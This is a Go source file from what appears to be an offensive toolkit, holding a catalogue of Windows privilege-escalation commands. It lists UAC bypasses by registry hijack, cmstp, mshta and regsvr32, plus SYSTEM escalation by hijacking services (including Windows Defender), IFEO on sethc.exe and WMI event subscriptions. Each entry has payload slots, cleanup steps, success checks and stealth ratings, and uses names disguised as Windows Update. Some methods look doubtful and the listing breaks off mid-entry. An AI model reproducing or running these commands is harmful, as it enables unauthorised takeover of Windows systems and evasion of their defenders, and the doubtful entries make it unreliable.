package privesc

import (
	"fmt"
	"strings"
)

// escapeWindowsCommand properly escapes a command for Windows cmd.exe
// This handles nested quotes and special characters
func escapeWindowsCommand(cmd string) string {
	// If command contains quotes, we need to escape them properly
	// For cmd.exe, we escape quotes by doubling them
	if strings.Contains(cmd, `"`) {
		// Replace " with "" for cmd.exe escaping
		cmd = strings.ReplaceAll(cmd, `"`, `""`)
	}
	// Wrap in quotes if contains spaces
	if strings.Contains(cmd, " ") {
		return `"` + cmd + `"`
	}
	return cmd
}


// LOLBinEscalation provides stealthy privilege escalation using only LOLBins
type LOLBinEscalation struct{}

// LOLBinMethod represents a privilege escalation method using LOLBins
type LOLBinMethod struct {
	Name        string
	Description string
	EscalationType string // "User->Admin" or "Admin->System"
	Commands    []string  // Native Windows commands (no PowerShell)
	Detection   string    // How to detect if it worked
	NoiseLevel  string    // "Low", "Medium", "High"
	CheckResult string    // Optional: regex pattern to check in command output for success
}

// GetUserToAdminMethods returns LOLBin methods for User->Admin escalation
func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
	return []LOLBinMethod{
		{
			Name:           "Event Viewer Registry Hijack",
			Description:    "Exploits eventvwr.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "%s" /f`,
				`start eventvwr.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "FodHelper Registry Hijack",
			Description:    "Exploits fodhelper.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`fodhelper.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "ComputerDefaults Registry Hijack",
			Description:    "Exploits computerdefaults.exe auto-elevation",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`computerdefaults.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "SDCLT Bypass",
			Description:    "Exploits sdclt.exe /kickoffelev for UAC bypass",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "%s" /f`,
				`sdclt.exe /kickoffelev`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "SilentCleanup Scheduled Task",
			Description:    "Abuses SilentCleanup scheduled task that runs as admin",
			EscalationType: "User->Admin",
			Commands: []string{
				`schtasks /create /tn "WindowsUpdateCheck" /tr "cmd.exe /c \"%s\"" /sc onlogon /ru SYSTEM /f`,
				`schtasks /run /tn "WindowsUpdateCheck"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`schtasks /delete /tn "WindowsUpdateCheck" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "DiskCleanup Scheduled Task",
			Description:    "Abuses DiskCleanup scheduled task that runs as admin",
			EscalationType: "User->Admin",
			Commands: []string{
				`schtasks /create /tn "DiskCleanupEscalation" /tr "cmd.exe /c \"%s\"" /sc onlogon /ru SYSTEM /f`,
				`schtasks /run /tn "DiskCleanupEscalation"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`schtasks /delete /tn "DiskCleanupEscalation" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "CMSTP UAC Bypass",
			Description:    "Uses cmstp.exe to execute elevated code via INF file",
			EscalationType: "User->Admin",
			Commands: []string{
				`echo [version] > %TEMP%\cmstp.inf`,
				`echo Signature=$chicago$ >> %TEMP%\cmstp.inf`,
				`echo [DefaultInstall] >> %TEMP%\cmstp.inf`,
				`echo RunPreSetupCommands=Taskkill /F /IM cmstp.exe 2^>nul ^& "%s" >> %TEMP%\cmstp.inf`,
				`cmstp.exe /s %TEMP%\cmstp.inf`,
				`del %TEMP%\cmstp.inf`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "WSReset Registry Hijack",
			Description:    "Exploits wsreset.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\AppX82a6GwReNeqSDgT2LMq8qTqK8zqDTP8\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\AppX82a6GwReNeqSDgT2LMq8qTqK8zqDTP8\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`wsreset.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\AppX82a6GwReNeqSDgT2LMq8qTqK8zqDTP8\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "SilentCleanup Task Hijack",
			Description:    "Hijacks SilentCleanup scheduled task that runs as admin",
			EscalationType: "User->Admin",
			Commands: []string{
				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%s" /f`,
				`schtasks /run /tn "Microsoft\Windows\DiskCleanup\SilentCleanup"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%%windir%%\system32\cleanmgr.exe /autoclean /d %%c:%%" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Rundll32 ShellExecute",
			Description:    "Uses rundll32 to execute elevated code via ShellExecute",
			EscalationType: "User->Admin",
			Commands: []string{
				`rundll32.exe shell32.dll,ShellExec_RunDLL "%s"`,
				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "ComputerDefaults Alternative",
			Description:    "Alternative computerdefaults.exe execution method",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`cmd.exe /c "start computerdefaults.exe"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "mshta.exe UAC Bypass",
			Description:    "Uses mshta.exe to execute elevated code via HTA file",
			EscalationType: "User->Admin",
			Commands: []string{
				`echo ^<script^>new ActiveXObject("WScript.Shell").Run("cmd.exe /c %s",0)^</script^> > %TEMP%\update.hta`,
				`mshta.exe %TEMP%\update.hta`,
				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
				`del %TEMP%\update.hta`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "regsvr32.exe UAC Bypass",
			Description:    "Uses regsvr32.exe to execute elevated code via SCT file",
			EscalationType: "User->Admin",
			Commands: []string{
				`echo ^<?XML version="1.0"?^>^<scriptlet^>^<registration progid="WindowsUpdate" classid="{00000000-0000-0000-0000-000000000000}"^>^<script language="JScript"^>new ActiveXObject("WScript.Shell").Run("cmd.exe /c %s",0);^</script^>^</registration^>^</scriptlet^> > %TEMP%\update.sct`,
				`regsvr32.exe /s /n /u /i:%TEMP%\update.sct scrobj.dll`,
				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
				`del %TEMP%\update.sct`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "DiskCleanup Scheduled Task",
			Description:    "Hijacks DiskCleanup scheduled task that runs as admin",
			EscalationType: "User->Admin",
			Commands: []string{
				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%s" /f`,
				`schtasks /run /tn "Microsoft\Windows\DiskCleanup\SilentCleanup"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%%windir%%\system32\cleanmgr.exe /autoclean /d %%c:%%" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "WinSAT Registry Hijack",
			Description:    "Exploits WinSAT.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`winsat.exe formal`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "DISM.exe Registry Hijack",
			Description:    "Exploits DISM.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`dism.exe /online /cleanup-image /restorehealth`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Slui.exe Registry Hijack",
			Description:    "Exploits slui.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`slui.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "PkgMgr.exe Registry Hijack",
			Description:    "Exploits pkgmgr.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`pkgmgr.exe /iu:"WindowsUpdate"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Explorer.exe ShellExecute",
			Description:    "Uses explorer.exe to execute elevated code via ShellExecute",
			EscalationType: "User->Admin",
			Commands: []string{
				`explorer.exe shell:appsFolder\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!WindowsSecurity`,
				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
				`explorer.exe "%s"`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Write.exe Registry Hijack",
			Description:    "Exploits write.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`write.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Credwiz.exe Registry Hijack",
			Description:    "Exploits credwiz.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`credwiz.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "CLIConfg.exe Registry Hijack",
			Description:    "Exploits cliconfg.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32" /d "%s" /f`,
				`cliconfg.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "WinStore.exe Registry Hijack",
			Description:    "Exploits WinStore.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`WinStore.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "MMC.exe Registry Hijack",
			Description:    "Exploits mmc.exe auto-elevation via mscfile registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "%s" /f`,
				`start mmc.exe gpedit.msc`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "WinStoreApp.exe Registry Hijack",
			Description:    "Exploits WinStoreApp.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`WinStoreApp.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "CompMgmtLauncher.exe Registry Hijack",
			Description:    "Exploits CompMgmtLauncher.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "%s" /f`,
				`CompMgmtLauncher.exe compmgmt.msc`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "WerFault.exe Registry Hijack",
			Description:    "Exploits WerFault.exe auto-elevation via registry hijack",
			EscalationType: "User->Admin",
			Commands: []string{
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
				`werfault.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "TaskScheduler Task Hijack",
			Description:    "Hijacks TaskScheduler tasks that run as admin",
			EscalationType: "User->Admin",
			Commands: []string{
				`schtasks /change /tn "Microsoft\Windows\TaskScheduler\Maintenance" /tr "%s" /f`,
				`schtasks /run /tn "Microsoft\Windows\TaskScheduler\Maintenance"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`schtasks /change /tn "Microsoft\Windows\TaskScheduler\Maintenance" /tr "%%windir%%\system32\taskschd.exe" /f`,
			},
			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
			NoiseLevel: "Medium",
		},
	}
}

// GetAdminToSystemMethods returns LOLBin methods for Admin->System escalation
func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
	return []LOLBinMethod{
		{
			Name:           "Scheduled Task as SYSTEM",
			Description:    "Creates scheduled task running as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance" /tr "%s" /sc onlogon /ru SYSTEM /f`,
				`schtasks /run /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance"`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`schtasks /delete /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Service Creation as SYSTEM (PsExec-Inspired)",
			Description:    "Creates Windows service running as SYSTEM using PsExec's exact mechanism",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc create "MicrosoftUpdateService" binPath= "%s" type= own start= demand error= normal`,
				`sc start "MicrosoftUpdateService"`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`sc query "MicrosoftUpdateService" | findstr "RUNNING"`,
				`sc stop "MicrosoftUpdateService"`,
				`sc delete "MicrosoftUpdateService"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low", // Changed from Medium - demand start is less suspicious
		},
		{
			Name:           "WMI Process Creation as SYSTEM",
			Description:    "Uses WMI to create process as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`wmic process call create "%s"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
			CheckResult: "ReturnValue.*=.*0", // WMI ReturnValue 0 = success, non-zero = failure
		},
		{
			Name:           "Token Impersonation via Service",
			Description:    "Uses service token impersonation to run as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc create "UpdateService" binPath= "%s" type= own start= demand error= normal`,
				`sc start "UpdateService"`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`sc stop "UpdateService"`,
				`sc delete "UpdateService"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "COM Object Hijacking",
			Description:    "Uses COM object to execute as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`reg add "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /ve /d "%s" /f`,
				`rundll32.exe shell32.dll,ShellExec_RunDLL "%s"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Service Failure Recovery (Non-Critical)",
			Description:    "Abuses service failure recovery to execute as SYSTEM using non-critical service",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "Themes" binPath= "%s" type= own start= demand`,
				`sc failure "Themes" reset= 86400 actions= restart/60000/restart/60000/restart/60000`,
				`sc start "Themes"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "Themes" binPath= "%%systemroot%%\System32\svchost.exe -k netsvcs"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "WMI Temporary Event Subscription",
			Description:    "Creates temporary WMI event subscription to execute as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="TempFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'"`,
				`wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="TempConsumer", ExecutablePath="%s", CommandLineTemplate="%s"`,
				`wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"TempFilter\"", Consumer="CommandLineEventConsumer.Name=\"TempConsumer\""`,
				`start notepad.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
				`wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding DELETE`,
				`wmic /namespace:\\root\subscription PATH CommandLineEventConsumer DELETE`,
				`wmic /namespace:\\root\subscription PATH __EventFilter DELETE`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "DLL Hijacking via Service",
			Description:    "Exploits DLL search order hijacking in SYSTEM service",
			EscalationType: "Admin->System",
			Commands: []string{
				`copy "%s" "%WINDIR%\System32\version.dll"`,
				`sc stop "wscsvc"`,
				`sc start "wscsvc"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`del "%WINDIR%\System32\version.dll"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Network Location Awareness Service Hijack",
			Description:    "Hijacks NLA service binary path (non-critical)",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "NlaSvc" binPath= "%s"`,
				`sc start "NlaSvc"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "NlaSvc" binPath= "%%systemroot%%\System32\svchost.exe -k NetworkService"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Time Service Hijack",
			Description:    "Hijacks Windows Time service binary path (non-critical)",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "W32Time" binPath= "%s"`,
				`sc start "W32Time"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "W32Time" binPath= "%%systemroot%%\System32\svchost.exe -k LocalService"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Image File Execution Options (IFEO)",
			Description:    "Uses IFEO registry key to execute payload as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "%s" /f`,
				`sethc.exe`,
				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
				`reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Sticky Keys IFEO",
			Description:    "Uses IFEO on sethc.exe (Sticky Keys) to execute as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "%s" /f`,
				`cmd.exe /c "start sethc.exe"`,
				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
				`reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Unquoted Service Path Exploitation",
			Description:    "Exploits unquoted service path in SYSTEM service",
			EscalationType: "Admin->System",
			Commands: []string{
				`copy "%s" "C:\Program Files\WindowsUpdate.exe"`,
				`sc start "wuauserv"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`del "C:\Program Files\WindowsUpdate.exe"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Port Monitor Installation",
			Description:    "Installs port monitor DLL to execute as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`copy "%s" "%WINDIR%\System32\UpdateMonitor.dll"`,
				`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\UpdateMonitor" /v Driver /t REG_SZ /d "UpdateMonitor.dll" /f`,
				`sc stop "Spooler"`,
				`sc start "Spooler"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\UpdateMonitor" /f`,
				`del "%WINDIR%\System32\UpdateMonitor.dll"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Service SID Manipulation",
			Description:    "Creates service with restricted SID to run as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc create "RestrictedService" binPath= "%s" type= own start= demand obj= LocalSystem`,
				`sc start "RestrictedService"`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`sc stop "RestrictedService"`,
				`sc delete "RestrictedService"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Scheduled Task Immediate Execution",
			Description:    "Creates scheduled task with immediate trigger",
			EscalationType: "Admin->System",
			Commands: []string{
				`schtasks /create /tn "Microsoft\Windows\Maintenance\SystemUpdate" /tr "%s" /sc once /st 23:59 /ru SYSTEM /f`,
				`schtasks /run /tn "Microsoft\Windows\Maintenance\SystemUpdate"`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`schtasks /delete /tn "Microsoft\Windows\Maintenance\SystemUpdate" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Defender Service Hijack",
			Description:    "Hijacks Windows Defender service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "WinDefend" binPath= "%s"`,
				`sc start "WinDefend"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "WinDefend" binPath= "%%systemroot%%\System32\svchost.exe -k secsvcs"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Remote Registry Service Hijack",
			Description:    "Hijacks Remote Registry service binary path (non-critical)",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "RemoteRegistry" binPath= "%s"`,
				`sc start "RemoteRegistry"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "RemoteRegistry" binPath= "%%systemroot%%\system32\svchost.exe -k LocalService"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Task Scheduler at.exe",
			Description:    "Uses at.exe to schedule task as SYSTEM",
			EscalationType: "Admin->System",
			Commands: []string{
				`at 23:59 "%s"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`at /delete /yes`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Update Orchestrator Service Hijack",
			Description:    "Hijacks Windows Update Orchestrator service (non-critical)",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "UsoSvc" binPath= "%s"`,
				`sc start "UsoSvc"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "UsoSvc" binPath= "%%systemroot%%\system32\svchost.exe -k netsvcs"`,
			},
